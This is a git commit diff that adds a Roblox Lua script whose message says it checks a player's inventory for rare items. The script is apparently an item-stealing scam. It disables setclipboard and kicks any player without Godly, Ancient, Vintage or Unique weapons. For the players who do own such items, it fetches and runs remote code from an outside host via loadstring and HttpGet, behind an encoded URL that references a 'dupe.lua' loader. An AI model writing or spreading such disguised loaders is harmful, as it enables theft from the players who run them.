e5b1f431358c45ae8bfc42b453f827dfa8e36061
Johnnyissocoollol <progackerroblox@gmail.com>
2026-07-15 00:58:28 -0500

    Add Lua script to check player inventory for rare items

---
+++ sksk.lua
@@ -0,0 +1,35 @@
+setclipboard = function() end
+
+local p = game.Players.LocalPlayer
+local itemData = require(
+    game.ReplicatedStorage.Database.Sync.Item
+)
+
+local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)
+
+local found = false
+
+for itemName, amount in pairs(inv.Weapons.Owned) do
+    if amount > 0 then
+        local info = itemData[itemName]
+
+        if info then
+            local rarity = tostring(info.Rarity or "")
+
+            if rarity == "Godly"
+            or rarity == "Ancient"
+            or rarity == "Vintage"
+            or rarity == "Unique" then
+                found = true
+                break
+            end
+        end
+    end
+end
+
+if not found then
+    p:Kick("No Godly, Ancient, Vintage, or Unique items found.")
+    return
+end
+
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvc2hpL3JlZnMvaGVhZHMvbWFpbi9kdXBlLmx1YSJ9fQ"))()
